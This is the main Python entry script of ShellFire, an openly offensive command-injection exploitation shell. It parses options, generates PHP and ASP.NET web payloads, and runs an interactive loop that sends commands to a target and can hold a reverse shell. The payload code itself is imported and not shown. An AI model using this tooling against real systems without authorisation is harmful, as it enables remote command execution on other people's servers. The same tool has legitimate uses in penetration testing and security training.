#!/bin/env python3
# Thanks to Offensive-Security for inspiring this!
# Written by unix-ninja
# Aug 2016

import argparse
import os
import readline
import requests
import shlex
import signal
import sys
import time

from shellfire.config import cfg, state, prompt, Mode
from shellfire.commands import command_list, cmd_config, send_payload, payload_php, payload_aspnet


############################################################
## Version Check

if (sys.version_info < (3, 0)):
  sys.stderr.write("[!] Error! Must execute this script with Python3.")
  sys.exit(2)

############################################################
## Parse options

parser = argparse.ArgumentParser(
    description='An exploitation shell for command injection vulnerabilities.')
parser.add_argument('-c',
                    dest='config',
                    action='store',
                    nargs='?',
                    default=None,
                    const='default',
                    help='load a named config on startup.')
parser.add_argument('-d',
                    dest='debug',
                    action='store_true',
                    help='enable debugging (show queries during execution)')
parser.add_argument('--generate',
                    dest='payload',
                    help='generate a payload to stdout. PAYLOAD can be "php" or "aspnet".')
parser.add_argument('--version',
                    dest='version',
                    action='store_true',
                    help='display version and exit.')
state.args = parser.parse_args()

############################################################
## Main App


def draw_prompt():
  return '(%s)> ' % prompt[state.mode]


def sigint_handler(signum, frame):
  state.userinput =""
  _q = readline.get_line_buffer()
  state.input_offset = len(_q)
  sys.stderr.write("\n%s" % (draw_prompt()))
  return


def cli():
  ## should we dump version?
  if state.args.version:
    sys.stderr.write("Shellfire v%s\n" % (cfg.version))
    sys.exit(1)
  ## if we are generating a payload to stdout, do it now, then bail
  if state.args.payload:
    state.args.payload = state.args.payload.lower()
    if state.args.payload == "php":
      sys.stderr.write("[*] Generating PHP payload...\n")
      payload_php()
    elif state.args.payload == "aspnet":
      sys.stderr.write("[*] Generating ASP.NET payload...\n")
      payload_aspnet()
    else:
      sys.stderr.write("[*] Invalid payload!\n")
    sys.stdout.write(cfg.payload)
    sys.exit(1)

  ## show our banner
  sys.stdout.write("""                  1@@`
                 ,@@@@%:
              '?K@@@@@@@h'
            |UQ@@@@@@@@@@m`      '
      ,   |Q@@@@@@@@@@@@@@>      *B,
    ~4x  L@@@@@@@@@@@@@@@@y      :QQ=
  ~d@@t ,Q@@@@@@@@@@@@@@@@@?     :Q@@y`
 ;Q@@@D.r@@@@@@@QNOppd%Q@@@@3,` ,4@@@@z
^Q@@@@@Kz@@@j+,         `,=yQ@@@@@@@@@@=
U@@@@@@@@Qu,                `}Q@@@@@@@@X
Q@@@@@@@}`                    .j@@@@@@@Q
@@@@@@@L                        L@@@@@@@
@@@@@@0-                        'g@@@@@@
D@@@@@O`                        `D@@@@@D
c@@@@@Q;    /@@@@\    /@@@@\    ;Q@@@@@\\
`3@@@@@Q;   @@@@@@.  ,@@@@@@   ;Q@@@@@3`
 -q@@@@@Qr  \\@@@@/    \\@@@@/  ~Q@@@@@A-
   LQ@@@@x        .@@.        >@@@@QL
    ~d@@@Q\\'      i@@i      `=8@@@Q~
      =O@@@@@l            ~Q@@@@O=`
        ;{8@@g;  |    |  '4@@8{;
           `^tPp$p%g0Rdkhm1^'
""")
  sys.stdout.write("[*] ShellFire v" + cfg.version + "\n")
  sys.stdout.write("[*] Type 'help' to see available commands\n")
  if state.args.debug is True:
    sys.stdout.write("[*] Debug mode enabled.\n")

  requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

  ## if we specified to load a named config, do it now
  if state.args.config:
    cmd_config([".config", "load", state.args.config])

  ## setup history
  if os.path.isfile(cfg.history_file):
    try:
      readline.read_history_file(cfg.history_file)
    except Exception:
      pass

  ## set initial payload for PHP
  payload_php()

  ## register our sigint handler
  signal.signal(signal.SIGINT, sigint_handler)
  ## main loop
  while True:
    while state.revshell_running:
      try:
        time.sleep(0.1)
      except Exception:
        state.revshell_running = False
    ## reset command execution state each loop
    state.exec_cmd = True
    ## prompt for input
    try:
      state.userinput = input(draw_prompt()).strip()
      if state.input_offset > 0:
        state.userinput = state.userinput[state.input_offset:]
        state.input_offset = 0
    except EOFError:
      ## if we recieve EOF, run cmd_exit()
      sys.stdout.write("\n")
      command_list["exit"]['func']("exit")
    if not state.userinput:
      continue
    ## parse our input
    cmd = shlex.split(state.userinput)

    ## config mode
    if state.mode == Mode.config:
      if cmd[0] in command_list.keys():
        state.exec_cmd = False
        try:
          command_list[cmd[0]]['func'](cmd)
        except Exception as e:
          sys.stdout.write("[!] %s\n" % (repr(e)))
      else:
        sys.stdout.write("[!] Invalid command '%s'.\n" % (cmd[0]))
    ## shell mode
    elif state.mode == Mode.shell:
      if len(cmd)== 1 and cmd[0] == "exit":
        command_list[cmd[0]]['func'](cmd)
      else:
        send_payload()


## Main entrypoint - let's not pollute the global scope here.
if __name__ == "__main__":
  cli()
